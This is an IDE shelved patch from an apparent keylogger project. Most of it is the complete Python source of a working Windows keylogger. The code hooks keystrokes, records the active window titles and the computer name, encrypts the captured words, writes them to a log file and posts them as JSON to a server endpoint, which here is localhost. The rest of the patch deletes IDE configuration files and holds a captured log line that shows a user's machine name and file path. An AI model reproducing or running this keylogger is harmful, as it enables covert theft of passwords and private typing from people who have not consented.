@@ -1,0 +1,380 @@
+Index: Agent/try_keylogger.py
+IDEA additional info:
+Subsystem: com.intellij.openapi.diff.impl.patch.BaseRevisionTextPatchEP
+<+>import socket\r\nimport ctypes\r\nimport win32api\r\nimport win32gui\r\nimport win32process\r\nfrom pynput.keyboard import Listener, Key\r\nimport requests\r\nimport datetime\r\nfrom Encryption import encryption\r\n\r\n\r\ndef get_system_info():\r\n    return {\r\n        \"computer_name\": socket.gethostname(),\r\n    }\r\n\r\nuser32 = ctypes.WinDLL('user32', use_last_error=True)\r\n\r\nclass KeyLogger:\r\n    def __init__(self, server_url, log_file=\"a.txt\", max_words_per_line=10):\r\n        self.server_url = server_url\r\n        self.log_file = log_file\r\n        self.current_word = \"\"\r\n        self.words_buffer = []\r\n        self.max_words_per_line = max_words_per_line\r\n        self.last_active_window = None\r\n        self.pressed_keys = set()\r\n        self.computer_name = get_system_info()[\"computer_name\"]\r\n        self.current_window_title = \"\"\r\n\r\n        self.modifier_keys = {\r\n            Key.ctrl_l, Key.ctrl_r,\r\n            Key.alt_l, Key.alt_r,\r\n            Key.shift, Key.shift_l, Key.shift_r,\r\n            Key.cmd, Key.cmd_l, Key.cmd_r\r\n        }\r\n\r\n    def get_keyboard_layout(self):\r\n        hwnd = win32gui.GetForegroundWindow()\r\n        thread_id, _ = win32process.GetWindowThreadProcessId(hwnd)\r\n        return win32api.GetKeyboardLayout(thread_id)\r\n\r\n    def get_active_window_info(self):\r\n        hwnd = win32gui.GetForegroundWindow()\r\n        if hwnd != self.last_active_window:\r\n            self.last_active_window = hwnd\r\n            window_title = win32gui.GetWindowText(hwnd)\r\n            self.current_window_title = window_title\r\n            return window_title\r\n        return None\r\n\r\n    def send_to_server(self, data):\r\n        try:\r\n            response = requests.post(self.server_url, json=data)\r\n            if response.status_code != 200:\r\n                print(f\"[Warning] Server responded with status code {response.status_code}\")\r\n        except Exception as e:\r\n            print(f\"[Error] Sending data to server failed: {e}\")\r\n\r\n    def write_to_file(self, data):\r\n        try:\r\n            with open(self.log_file, \"a\", encoding=\"utf-8\") as f:\r\n                f.write(data)\r\n        except Exception as e:\r\n            print(f\"[Error] Writing to file failed: {e}\")\r\n\r\n    def log_active_window_change(self):\r\n        title = self.get_active_window_info()\r\n        if title is not None:\r\n            log_line = f\"\\n\\n[Active Window: '{title}']\\n\"\r\n            self.write_to_file(log_line)\r\n            print(log_line, end='')\r\n\r\n    def get_character_from_vk_code(self, vk_code):\r\n        layout = self.get_keyboard_layout()\r\n        scan_code = user32.MapVirtualKeyExW(vk_code, 0, layout)\r\n        key_state = (ctypes.c_ubyte * 256)()\r\n        buffer = ctypes.create_unicode_buffer(5)\r\n        result = user32.ToUnicodeEx(vk_code, scan_code, key_state, buffer, len(buffer), 0, layout)\r\n        return buffer.value if result > 0 else ''\r\n\r\n    def get_pressed_modifiers_names(self):\r\n        names = []\r\n        for mod_key in self.pressed_keys:\r\n            if mod_key in {Key.ctrl_l, Key.ctrl_r}:\r\n                names.append('Ctrl')\r\n            elif mod_key in {Key.alt_l, Key.alt_r}:\r\n                names.append('Alt')\r\n            elif mod_key in {Key.shift, Key.shift_l, Key.shift_r}:\r\n                names.append('Shift')\r\n            elif mod_key in {Key.cmd, Key.cmd_l, Key.cmd_r}:\r\n                names.append('Cmd')\r\n        return names\r\n\r\n    def _add_word_to_buffer(self, word=None):\r\n        if word is None:\r\n            word = self.current_word\r\n\r\n        if word:\r\n            self.words_buffer.append(encryption(word))\r\n            self.current_word = \"\"\r\n\r\n        if len(self.words_buffer) >= self.max_words_per_line:\r\n            self.flush_buffer(newline=True)\r\n\r\n    def flush_buffer(self, newline=False, final=False):\r\n        if final and self.current_word:\r\n            self.words_buffer.append(encryption(self.current_word))\r\n            self.current_word = \"\"\r\n\r\n        if self.words_buffer:\r\n            line = ' '.join(self.words_buffer)\r\n            timestamp_str = datetime.datetime.now().strftime(\"%Y-%m-%d %H:%M:%S\")\r\n\r\n\r\n            json_data = {\r\n                \"computer_name\": self.computer_name,\r\n                \"timestamp\": timestamp_str,\r\n                \"active_window\": self.current_window_title,\r\n                \"log\": line\r\n            }\r\n\r\n\r\n            self.send_to_server(json_data)\r\n\r\n\r\n            line_to_write = f\"{line}  [{timestamp_str}] [Window: {self.current_window_title}]\\n\"\r\n            self.write_to_file(line_to_write)\r\n\r\n            if newline:\r\n                print(f\"  [{timestamp_str}]\\n\", end='')\r\n\r\n            self.words_buffer = []\r\n\r\n    def on_key_press(self, key):\r\n        try:\r\n            self.log_active_window_change()\r\n\r\n            if key in self.modifier_keys:\r\n                self.pressed_keys.add(key)\r\n                return\r\n\r\n            if key == Key.esc:\r\n                print(\"\\n[Stopped by ESC]\")\r\n                self.flush_buffer(final=True)\r\n                return False\r\n\r\n            elif key == Key.space:\r\n                self._add_word_to_buffer()\r\n                print(' ', end='', flush=True)\r\n\r\n            elif key == Key.enter:\r\n                self._add_word_to_buffer()\r\n                self.flush_buffer(newline=True)\r\n                print('\\n', end='', flush=True)\r\n\r\n            elif key == Key.backspace:\r\n                if self.current_word:\r\n                    self.current_word = self.current_word[:-1]\r\n                    print('\\b \\b', end='', flush=True)\r\n\r\n            elif hasattr(key, 'vk'):\r\n                modifiers_pressed = self.get_pressed_modifiers_names()\r\n                char = self.get_character_from_vk_code(key.vk)\r\n\r\n                if modifiers_pressed:\r\n                    combo = '+'.join(modifiers_pressed)\r\n                    if char:\r\n                        combo += f\"+{char}\"\r\n                    else:\r\n                        combo += f\"+{key.name if hasattr(key, 'name') else str(key)}\"\r\n                    self._add_word_to_buffer(combo)\r\n                    print(f\"[{combo}]\", end='', flush=True)\r\n                else:\r\n                    if char:\r\n                        self.current_word += char\r\n                        print(char, end='', flush=True)\r\n\r\n        except Exception as error:\r\n            print(f\"\\n[Error]: {error}\")\r\n\r\n    def on_key_release(self, key):\r\n        if key in self.modifier_keys and key in self.pressed_keys:\r\n            self.pressed_keys.remove(key)\r\n\r\n    def run(self):\r\n\r\n        print(\"Keylogger started. Press ESC to stop.\\n\")\r\n\r\n        with Listener(on_press=self.on_key_press, on_release=self.on_key_release) as listener:\r\n            listener.join()\r\n\r\nif __name__ == \"__main__\":\r\n    SERVER_URL = \"http://127.0.0.1:5000/api/data\"\r\n    LOG_FILE = \"a.txt\"\r\n\r\n    keylogger = KeyLogger(server_url=SERVER_URL, log_file=LOG_FILE)\r\n\r\n\r\n    system_info = get_system_info()\r\n    system_info_line = f\"[System Info] computer Name: {system_info['computer_name']}\\n\"\r\n    keylogger.write_to_file(system_info_line)\r\n    print(system_info_line)\r\n\r\n    keylogger.run()\r\n
+Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP
+<+>UTF-8
+===================================================================
+diff --git a/Agent/try_keylogger.py b/Agent/try_keylogger.py
+--- a/Agent/try_keylogger.py	(revision 4b17a3cfdb9d93f9647da61ceca7bf84b44169b6)
++++ b/Agent/try_keylogger.py	(date 1756906417737)
+@@ -198,7 +198,7 @@
+ 
+ 
+     system_info = get_system_info()
+-    system_info_line = f"[System Info] computer Name: {system_info['computer_name']}\n"
++    system_info_line = f"[System Info] Computer Name: {system_info['computer_name']}\n"
+     keylogger.write_to_file(system_info_line)
+     print(system_info_line)
+ 
+Index: .idea/vcs.xml
+IDEA additional info:
+Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP
+<+>UTF-8
+===================================================================
+diff --git a/.idea/vcs.xml b/.idea/vcs.xml
+deleted file mode 100644
+--- a/.idea/vcs.xml	(revision 4b17a3cfdb9d93f9647da61ceca7bf84b44169b6)
++++ /dev/null	(revision 4b17a3cfdb9d93f9647da61ceca7bf84b44169b6)
+@@ -1,7 +0,0 @@
+-<?xml version="1.0" encoding="UTF-8"?>
+-<project version="4">
+-  <component name="VcsDirectoryMappings">
+-    <mapping directory="" vcs="Git" />
+-    <mapping directory="$PROJECT_DIR$" vcs="Git" />
+-  </component>
+-</project>
+\ No newline at end of file
+Index: .idea/keylogger.iml
+IDEA additional info:
+Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP
+<+>UTF-8
+===================================================================
+diff --git a/.idea/keylogger.iml b/.idea/keylogger.iml
+deleted file mode 100644
+--- a/.idea/keylogger.iml	(revision 4b17a3cfdb9d93f9647da61ceca7bf84b44169b6)
++++ /dev/null	(revision 4b17a3cfdb9d93f9647da61ceca7bf84b44169b6)
+@@ -1,8 +0,0 @@
+-<?xml version="1.0" encoding="UTF-8"?>
+-<module type="PYTHON_MODULE" version="4">
+-  <component name="NewModuleRootManager">
+-    <content url="file://$MODULE_DIR$" />
+-    <orderEntry type="jdk" jdkName="Python 3.13" jdkType="Python SDK" />
+-    <orderEntry type="sourceFolder" forTests="false" />
+-  </component>
+-</module>
+\ No newline at end of file
+Index: .idea/shelf/Uncommitted_changes_before_Update_at_03_09_2025_16_15_[Changes]/shelved.patch
+IDEA additional info:
+Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP
+<+>UTF-8
+===================================================================
+diff --git a/.idea/shelf/Uncommitted_changes_before_Update_at_03_09_2025_16_15_[Changes]/shelved.patch b/.idea/shelf/Uncommitted_changes_before_Update_at_03_09_2025_16_15_[Changes]/shelved.patch
+deleted file mode 100644
+--- a/.idea/shelf/Uncommitted_changes_before_Update_at_03_09_2025_16_15_[Changes]/shelved.patch	(revision 4b17a3cfdb9d93f9647da61ceca7bf84b44169b6)
++++ /dev/null	(revision 4b17a3cfdb9d93f9647da61ceca7bf84b44169b6)
+@@ -1,172 +0,0 @@
+-Index: Agent/a.txt
+-IDEA additional info:
+-Subsystem: com.intellij.openapi.diff.impl.patch.BaseRevisionTextPatchEP
+-<+>[System Info] computer Name: יהונתן\r\n\r\n\r\n[Active Window: 'PythonProject1 [C:/Users/yonat/PycharmProjects/PythonProject1] – keyiogger.py']\r\n
+-Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP
+-<+>UTF-8
+-===================================================================
+-diff --git a/Agent/a.txt b/Agent/a.txt
+---- a/Agent/a.txt	(revision b0fbd97ed92d922def7487113ba7d77d95d99d43)
+-+++ b/Agent/a.txt	(date 1756905187710)
+-@@ -1,4 +1,1 @@
+--[System Info] computer Name: יהונתן
+- 
+--
+--[Active Window: 'PythonProject1 [C:/Users/yonat/PycharmProjects/PythonProject1] – keyiogger.py']
+-Index: .idea/workspace.xml
+-IDEA additional info:
+-Subsystem: com.intellij.openapi.diff.impl.patch.BaseRevisionTextPatchEP
+-<+><?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<project version=\"4\">\r\n  <component name=\"ChangeListManager\">\r\n    <list default=\"true\" id=\"4e7d1948-d228-4e74-a5ef-fbd4563bd629\" name=\"Changes\" comment=\"\">\r\n      <change beforePath=\"$PROJECT_DIR$/kelogger.js\" beforeDir=\"false\" />\r\n      <change beforePath=\"$PROJECT_DIR$/keylogger.css\" beforeDir=\"false\" />\r\n      <change beforePath=\"$PROJECT_DIR$/keylogger.html\" beforeDir=\"false\" />\r\n      <change beforePath=\"$PROJECT_DIR$/keylogger.py\" beforeDir=\"false\" />\r\n    </list>\r\n    <option name=\"SHOW_DIALOG\" value=\"false\" />\r\n    <option name=\"HIGHLIGHT_CONFLICTS\" value=\"true\" />\r\n    <option name=\"HIGHLIGHT_NON_ACTIVE_CHANGELIST\" value=\"false\" />\r\n    <option name=\"LAST_RESOLUTION\" value=\"IGNORE\" />\r\n  </component>\r\n  <component name=\"Git.Settings\">\r\n    <option name=\"RECENT_GIT_ROOT_PATH\" value=\"$PROJECT_DIR$\" />\r\n  </component>\r\n  <component name=\"GitHubPullRequestSearchHistory\">{\r\n  &quot;lastFilter&quot;: {}\r\n}</component>\r\n  <component name=\"GithubPullRequestsUISettings\">{\r\n  &quot;selectedUrlAndAccountId&quot;: {\r\n    &quot;url&quot;: &quot;https://github.com/avi3165/keylogger.git&quot;,\r\n    &quot;accountId&quot;: &quot;9dcafd83-f118-4193-93c3-e0d46327e62b&quot;\r\n  }\r\n}</component>\r\n  <component name=\"ProjectColorInfo\">{\r\n  &quot;associatedIndex&quot;: 3\r\n}</component>\r\n  <component name=\"ProjectId\" id=\"328bGHZp0baxecKbvorZcrZNkwQ\" />\r\n  <component name=\"ProjectViewState\">\r\n    <option name=\"hideEmptyMiddlePackages\" value=\"true\" />\r\n    <option name=\"showLibraryContents\" value=\"true\" />\r\n  </component>\r\n  <component name=\"PropertiesComponent\">{\r\n  &quot;keyToString&quot;: {\r\n    &quot;ModuleVcsDetector.initialDetectionPerformed&quot;: &quot;true&quot;,\r\n    &quot;RunOnceActivity.ShowReadmeOnStart&quot;: &quot;true&quot;,\r\n    &quot;RunOnceActivity.git.unshallow&quot;: &quot;true&quot;,\r\n    &quot;git-widget-placeholder&quot;: &quot;main&quot;,\r\n    &quot;last_opened_file_path&quot;: &quot;C:/Users/User/Desktop/keylogger&quot;\r\n  }\r\n}</component>\r\n  <component name=\"SharedIndexes\">\r\n    <attachedChunks>\r\n      <set>\r\n        <option value=\"bundled-python-sdk-880ecab49056-36ea0e71a18c-com.jetbrains.pycharm.pro.sharedIndexes.bundled-PY-251.25410.122\" />\r\n      </set>\r\n    </attachedChunks>\r\n  </component>\r\n  <component name=\"TaskManager\">\r\n    <task active=\"true\" id=\"Default\" summary=\"Default task\">\r\n      <changelist id=\"4e7d1948-d228-4e74-a5ef-fbd4563bd629\" name=\"Changes\" comment=\"\" />\r\n      <created>1756805048589</created>\r\n      <option name=\"number\" value=\"Default\" />\r\n      <option name=\"presentableId\" value=\"Default\" />\r\n      <updated>1756805048589</updated>\r\n    </task>\r\n    <servers />\r\n  </component>\r\n</project>
+-Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP
+-<+>UTF-8
+-===================================================================
+-diff --git a/.idea/workspace.xml b/.idea/workspace.xml
+---- a/.idea/workspace.xml	(revision b0fbd97ed92d922def7487113ba7d77d95d99d43)
+-+++ b/.idea/workspace.xml	(date 1756905104062)
+-@@ -1,11 +1,12 @@
+- <?xml version="1.0" encoding="UTF-8"?>
+- <project version="4">
+-+  <component name="AutoImportSettings">
+-+    <option name="autoReloadType" value="SELECTIVE" />
+-+  </component>
+-   <component name="ChangeListManager">
+--    <list default="true" id="4e7d1948-d228-4e74-a5ef-fbd4563bd629" name="Changes" comment="">
+--      <change beforePath="$PROJECT_DIR$/kelogger.js" beforeDir="false" />
+--      <change beforePath="$PROJECT_DIR$/keylogger.css" beforeDir="false" />
+--      <change beforePath="$PROJECT_DIR$/keylogger.html" beforeDir="false" />
+--      <change beforePath="$PROJECT_DIR$/keylogger.py" beforeDir="false" />
+-+    <list default="true" id="4e7d1948-d228-4e74-a5ef-fbd4563bd629" name="Changes" comment="commit">
+-+      <change beforePath="$PROJECT_DIR$/.idea/misc.xml" beforeDir="false" afterPath="$PROJECT_DIR$/.idea/misc.xml" afterDir="false" />
+-+      <change beforePath="$PROJECT_DIR$/.idea/workspace.xml" beforeDir="false" afterPath="$PROJECT_DIR$/.idea/workspace.xml" afterDir="false" />
+-     </list>
+-     <option name="SHOW_DIALOG" value="false" />
+-     <option name="HIGHLIGHT_CONFLICTS" value="true" />
+-@@ -13,6 +14,11 @@
+-     <option name="LAST_RESOLUTION" value="IGNORE" />
+-   </component>
+-   <component name="Git.Settings">
+-+    <option name="RECENT_BRANCH_BY_REPOSITORY">
+-+      <map>
+-+        <entry key="$PROJECT_DIR$" value="yehonatan" />
+-+      </map>
+-+    </option>
+-     <option name="RECENT_GIT_ROOT_PATH" value="$PROJECT_DIR$" />
+-   </component>
+-   <component name="GitHubPullRequestSearchHistory">{
+-@@ -21,7 +27,7 @@
+-   <component name="GithubPullRequestsUISettings">{
+-   &quot;selectedUrlAndAccountId&quot;: {
+-     &quot;url&quot;: &quot;https://github.com/avi3165/keylogger.git&quot;,
+--    &quot;accountId&quot;: &quot;9dcafd83-f118-4193-93c3-e0d46327e62b&quot;
+-+    &quot;accountId&quot;: &quot;3eaa4fbb-9941-45a6-b295-9143a5b3d5b8&quot;
+-   }
+- }</component>
+-   <component name="ProjectColorInfo">{
+-@@ -32,15 +38,16 @@
+-     <option name="hideEmptyMiddlePackages" value="true" />
+-     <option name="showLibraryContents" value="true" />
+-   </component>
+--  <component name="PropertiesComponent">{
+--  &quot;keyToString&quot;: {
+--    &quot;ModuleVcsDetector.initialDetectionPerformed&quot;: &quot;true&quot;,
+--    &quot;RunOnceActivity.ShowReadmeOnStart&quot;: &quot;true&quot;,
+--    &quot;RunOnceActivity.git.unshallow&quot;: &quot;true&quot;,
+--    &quot;git-widget-placeholder&quot;: &quot;main&quot;,
+--    &quot;last_opened_file_path&quot;: &quot;C:/Users/User/Desktop/keylogger&quot;
+-+  <component name="PropertiesComponent"><![CDATA[{
+-+  "keyToString": {
+-+    "ModuleVcsDetector.initialDetectionPerformed": "true",
+-+    "Python.keylogger.executor": "Run",
+-+    "RunOnceActivity.ShowReadmeOnStart": "true",
+-+    "RunOnceActivity.git.unshallow": "true",
+-+    "git-widget-placeholder": "main",
+-+    "last_opened_file_path": "C:/Users/yonat/PycharmProjects/PythonProject1/keylogger"
+-   }
+--}</component>
+-+}]]></component>
+-   <component name="SharedIndexes">
+-     <attachedChunks>
+-       <set>
+-@@ -56,6 +63,62 @@
+-       <option name="presentableId" value="Default" />
+-       <updated>1756805048589</updated>
+-     </task>
+-+    <task id="LOCAL‎-00001" summary="commit">
+-+      <option name="closed" value="true" />
+-+      <created>1756903397394</created>
+-+      <option name="number" value="00001" />
+-+      <option name="presentableId" value="LOCAL‎-00001" />
+-+      <option name="project" value="LOCAL‎" />
+-+      <updated>1756903397394</updated>
+-+    </task>
+-+    <task id="LOCAL‎-00002" summary="commit">
+-+      <option name="closed" value="true" />
+-+      <created>1756903809620</created>
+-+      <option name="number" value="00002" />
+-+      <option name="presentableId" value="LOCAL‎-00002" />
+-+      <option name="project" value="LOCAL‎" />
+-+      <updated>1756903809620</updated>
+-+    </task>
+-+    <task id="LOCAL‎-00003" summary="commit">
+-+      <option name="closed" value="true" />
+-+      <created>1756904211489</created>
+-+      <option name="number" value="00003" />
+-+      <option name="presentableId" value="LOCAL‎-00003" />
+-+      <option name="project" value="LOCAL‎" />
+-+      <updated>1756904211489</updated>
+-+    </task>
+-+    <task id="LOCAL‎-00004" summary="commit">
+-+      <option name="closed" value="true" />
+-+      <created>1756904323127</created>
+-+      <option name="number" value="00004" />
+-+      <option name="presentableId" value="LOCAL‎-00004" />
+-+      <option name="project" value="LOCAL‎" />
+-+      <updated>1756904323127</updated>
+-+    </task>
+-+    <task id="LOCAL‎-00005" summary="commit">
+-+      <option name="closed" value="true" />
+-+      <created>1756905018871</created>
+-+      <option name="number" value="00005" />
+-+      <option name="presentableId" value="LOCAL‎-00005" />
+-+      <option name="project" value="LOCAL‎" />
+-+      <updated>1756905018871</updated>
+-+    </task>
+-+    <option name="localTasksCounter" value="6" />
+-     <servers />
+-   </component>
+-+  <component name="Vcs.Log.Tabs.Properties">
+-+    <option name="TAB_STATES">
+-+      <map>
+-+        <entry key="MAIN">
+-+          <value>
+-+            <State />
+-+          </value>
+-+        </entry>
+-+      </map>
+-+    </option>
+-+  </component>
+-+  <component name="VcsManagerConfiguration">
+-+    <MESSAGE value="commit" />
+-+    <option name="LAST_COMMIT_MESSAGE" value="commit" />
+-+  </component>
+- </project>
+-\ No newline at end of file
+-Index: .idea/misc.xml
+-IDEA additional info:
+-Subsystem: com.intellij.openapi.diff.impl.patch.BaseRevisionTextPatchEP
+-<+><?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<project version=\"4\">\r\n  <component name=\"ProjectRootManager\" version=\"2\" project-jdk-name=\"Python 3.13\" project-jdk-type=\"Python SDK\" />\r\n</project>
+-Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP
+-<+>UTF-8
+-===================================================================
+-diff --git a/.idea/misc.xml b/.idea/misc.xml
+---- a/.idea/misc.xml	(revision b0fbd97ed92d922def7487113ba7d77d95d99d43)
+-+++ b/.idea/misc.xml	(date 1756903421596)
+-@@ -1,4 +1,7 @@
+- <?xml version="1.0" encoding="UTF-8"?>
+- <project version="4">
+-+  <component name="Black">
+-+    <option name="sdkName" value="Python 3.13" />
+-+  </component>
+-   <component name="ProjectRootManager" version="2" project-jdk-name="Python 3.13" project-jdk-type="Python SDK" />
+- </project>
+-\ No newline at end of file
+Index: .idea/inspectionProfiles/profiles_settings.xml
+IDEA additional info:
+Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP
+<+>UTF-8
+===================================================================
+diff --git a/.idea/inspectionProfiles/profiles_settings.xml b/.idea/inspectionProfiles/profiles_settings.xml
+deleted file mode 100644
+--- a/.idea/inspectionProfiles/profiles_settings.xml	(revision 4b17a3cfdb9d93f9647da61ceca7bf84b44169b6)
++++ /dev/null	(revision 4b17a3cfdb9d93f9647da61ceca7bf84b44169b6)
+@@ -1,6 +0,0 @@
+-<component name="InspectionProjectProfileManager">
+-  <settings>
+-    <option name="USE_PROJECT_PROFILE" value="false" />
+-    <version value="1.0" />
+-  </settings>
+-</component>
+\ No newline at end of file
+Index: .idea/workspace.xml
+IDEA additional info:
+Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP
+<+>UTF-8
+===================================================================
+diff --git a/.idea/workspace.xml b/.idea/workspace.xml
+deleted file mode 100644
+--- a/.idea/workspace.xml	(revision 4b17a3cfdb9d93f9647da61ceca7bf84b44169b6)
++++ /dev/null	(revision 4b17a3cfdb9d93f9647da61ceca7bf84b44169b6)
+@@ -1,62 +0,0 @@
+-<?xml version="1.0" encoding="UTF-8"?>
+-<project version="4">
+-  <component name="AutoImportSettings">
+-    <option name="autoReloadType" value="SELECTIVE" />
+-  </component>
+-  <component name="ChangeListManager">
+-    <list default="true" id="4e7d1948-d228-4e74-a5ef-fbd4563bd629" name="Changes" comment="">
+-      <change afterPath="$PROJECT_DIR$/.idea/shelf/Uncommitted_changes_before_Update_at_03_09_2025_16_15_[Changes]/shelved.patch" afterDir="false" />
+-      <change afterPath="$PROJECT_DIR$/.idea/shelf/Uncommitted_changes_before_Update_at_03_09_2025_16_15__Changes_.xml" afterDir="false" />
+-    </list>
+-    <option name="SHOW_DIALOG" value="false" />
+-    <option name="HIGHLIGHT_CONFLICTS" value="true" />
+-    <option name="HIGHLIGHT_NON_ACTIVE_CHANGELIST" value="false" />
+-    <option name="LAST_RESOLUTION" value="IGNORE" />
+-  </component>
+-  <component name="Git.Settings">
+-    <option name="RECENT_GIT_ROOT_PATH" value="$PROJECT_DIR$" />
+-  </component>
+-  <component name="GitHubPullRequestSearchHistory">{
+-  &quot;lastFilter&quot;: {}
+-}</component>
+-  <component name="GithubPullRequestsUISettings">{
+-  &quot;selectedUrlAndAccountId&quot;: {
+-    &quot;url&quot;: &quot;https://github.com/avi3165/keylogger.git&quot;,
+-    &quot;accountId&quot;: &quot;9dcafd83-f118-4193-93c3-e0d46327e62b&quot;
+-  }
+-}</component>
+-  <component name="ProjectColorInfo">{
+-  &quot;associatedIndex&quot;: 3
+-}</component>
+-  <component name="ProjectId" id="328bGHZp0baxecKbvorZcrZNkwQ" />
+-  <component name="ProjectViewState">
+-    <option name="hideEmptyMiddlePackages" value="true" />
+-    <option name="showLibraryContents" value="true" />
+-  </component>
+-  <component name="PropertiesComponent">{
+-  &quot;keyToString&quot;: {
+-    &quot;ModuleVcsDetector.initialDetectionPerformed&quot;: &quot;true&quot;,
+-    &quot;RunOnceActivity.ShowReadmeOnStart&quot;: &quot;true&quot;,
+-    &quot;RunOnceActivity.git.unshallow&quot;: &quot;true&quot;,
+-    &quot;git-widget-placeholder&quot;: &quot;main&quot;,
+-    &quot;last_opened_file_path&quot;: &quot;C:/Users/User/Desktop/keylogger&quot;
+-  }
+-}</component>
+-  <component name="SharedIndexes">
+-    <attachedChunks>
+-      <set>
+-        <option value="bundled-python-sdk-880ecab49056-36ea0e71a18c-com.jetbrains.pycharm.pro.sharedIndexes.bundled-PY-251.25410.122" />
+-      </set>
+-    </attachedChunks>
+-  </component>
+-  <component name="TaskManager">
+-    <task active="true" id="Default" summary="Default task">
+-      <changelist id="4e7d1948-d228-4e74-a5ef-fbd4563bd629" name="Changes" comment="" />
+-      <created>1756805048589</created>
+-      <option name="number" value="Default" />
+-      <option name="presentableId" value="Default" />
+-      <updated>1756805048589</updated>
+-    </task>
+-    <servers />
+-  </component>
+-</project>
+\ No newline at end of file
+Index: .idea/modules.xml
+IDEA additional info:
+Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP
+<+>UTF-8
+===================================================================
+diff --git a/.idea/modules.xml b/.idea/modules.xml
+deleted file mode 100644
+--- a/.idea/modules.xml	(revision 4b17a3cfdb9d93f9647da61ceca7bf84b44169b6)
++++ /dev/null	(revision 4b17a3cfdb9d93f9647da61ceca7bf84b44169b6)
+@@ -1,8 +0,0 @@
+-<?xml version="1.0" encoding="UTF-8"?>
+-<project version="4">
+-  <component name="ProjectModuleManager">
+-    <modules>
+-      <module fileurl="file://$PROJECT_DIR$/.idea/keylogger.iml" filepath="$PROJECT_DIR$/.idea/keylogger.iml" />
+-    </modules>
+-  </component>
+-</project>
+\ No newline at end of file
+Index: .idea/misc.xml
+IDEA additional info:
+Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP
+<+>UTF-8
+===================================================================
+diff --git a/.idea/misc.xml b/.idea/misc.xml
+deleted file mode 100644
+--- a/.idea/misc.xml	(revision 4b17a3cfdb9d93f9647da61ceca7bf84b44169b6)
++++ /dev/null	(revision 4b17a3cfdb9d93f9647da61ceca7bf84b44169b6)
+@@ -1,4 +0,0 @@
+-<?xml version="1.0" encoding="UTF-8"?>
+-<project version="4">
+-  <component name="ProjectRootManager" version="2" project-jdk-name="Python 3.13" project-jdk-type="Python SDK" />
+-</project>
+\ No newline at end of file
+Index: .idea/shelf/Uncommitted_changes_before_Update_at_03_09_2025_16_15__Changes_.xml
+IDEA additional info:
+Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP
+<+>UTF-8
+===================================================================
+diff --git a/.idea/shelf/Uncommitted_changes_before_Update_at_03_09_2025_16_15__Changes_.xml b/.idea/shelf/Uncommitted_changes_before_Update_at_03_09_2025_16_15__Changes_.xml
+deleted file mode 100644
+--- a/.idea/shelf/Uncommitted_changes_before_Update_at_03_09_2025_16_15__Changes_.xml	(revision 4b17a3cfdb9d93f9647da61ceca7bf84b44169b6)
++++ /dev/null	(revision 4b17a3cfdb9d93f9647da61ceca7bf84b44169b6)
+@@ -1,7 +0,0 @@
+-<changelist name="Uncommitted_changes_before_Update_at_03_09_2025_16_15_[Changes]" date="1756905330352" recycled="false" toDelete="true">
+-  <option name="PATH" value="$PROJECT_DIR$/.idea/shelf/Uncommitted_changes_before_Update_at_03_09_2025_16_15_[Changes]/shelved.patch" />
+-  <option name="DESCRIPTION" value="Uncommitted changes before Update at 03/09/2025 16:15 [Changes]" />
+-  <binary>
+-    <option name="BEFORE_PATH" value="A0C93726-749C-E48E-E9F8-CA695BC297C0.jpg" />
+-  </binary>
+-</changelist>
+\ No newline at end of file
